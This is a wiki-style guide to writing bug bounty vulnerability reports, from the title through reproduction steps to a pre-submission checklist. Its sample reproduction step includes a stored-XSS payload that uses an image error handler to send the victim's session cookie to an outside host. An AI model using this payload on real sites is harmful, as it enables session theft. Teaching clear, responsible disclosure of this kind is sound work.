---
title: Report writing — step by step
slug: report-writing-step-by-step
---

> **TL;DR:** Title → summary → severity → repro → impact → recommendation → validate-before-submit. Each step has a failure mode that gets reports closed.

## What it is
A bug submission is a structured argument that a specific weakness exists, can be triggered reliably, and damages the business if exploited. Triagers spend roughly 60 seconds on the first read; the writeup has that long to convince them to keep reading. The step-by-step structure exists to front-load conviction.

## Preconditions / where it applies
- You have a confirmed bug with a working PoC
- Program rules and severity matrix are read; you know which categories pay and which are out-of-scope
- You have already chained the impact you intend to claim ([[demonstrating-impact]])

## Technique
1. **Title.** One line, bug class + asset + impact. Failure mode: vague.
   - Bad: "Security issue on the site"
   - Good: "Stored XSS in /support/tickets allows session theft for any logged-in user"
2. **Summary (TL;DR).** Two-to-three sentences that stand alone. The triager should know severity from the summary alone. Failure mode: technical jargon, no impact statement.
3. **Severity / CVSS.** Pre-fill the program's matrix or CVSS calculator. Don't inflate; over-claiming gets the submission flagged Informative. Cite the vector string.
4. **Affected asset(s).** Exact URLs, parameters, headers, account roles required. Failure mode: forgetting to specify auth state or role.
5. **Reproduction steps.** Numbered, plain-English. Include the exact request (curl or Burp repeater export) and the exact response. Failure mode: ambiguous "click here" without the underlying request.

```
1. Log in as an unprivileged user at https://target.tld/login
2. POST the following to /api/comments:
   POST /api/comments HTTP/1.1
   Host: target.tld
   Content-Type: application/json
   {"body":"<img src=x onerror=fetch('https://x.com/?c='+document.cookie)>"}
3. Log in as any second user; visit /support/tickets/42
4. Observe the callback to x.com containing the second user's session
```

6. **Impact.** Tie the bug to a business outcome. See [[demonstrating-impact]]. Failure mode: stopping at "an attacker could…" without saying for whom or at what scale.
7. **Suggested remediation.** Short and technically correct. Failure mode: hand-waving ("use sanitisation"); good fix advice cites the specific OWASP / framework guidance.
8. **Validation pass.** Before submit:
   - Re-run the repro from a fresh browser / incognito — works?
   - Is every screenshot redacted of your own PII?
   - Are you within the program's scope and rules?
   - Is the severity supported by the impact section?
   - Title still accurate after edits?
9. Submit. Resist the urge to start a second submission immediately on the same target — give triage room to ask clarifying questions on the first one.

## Detection and defence
- For program operators: publish severity examples in the policy so hunters can self-calibrate. Reward clarity in disclosure to encourage future high-quality submissions
- Closed-as-Informative is a signalling failure on both sides; ask "what would have made this Triaged?" if you get hit with one
- For hunters: keep a personal template / snippet library — title patterns, common impact paragraphs, severity matrices per program — and copy-edit from there to avoid blank-page paralysis

## References
- [HackerOne — Quality reports guide](https://docs.hackerone.com/hackers/quality-reports.html) — official guidance
- [Bugcrowd — Writing good vulnerability submissions](https://docs.bugcrowd.com/researchers/reporting-managing-submissions/submitting-reports/) — checklist
- [Real-World Bug Hunting (Yaworski)](https://nostarch.com/bughunting) — annotated real-world disclosures
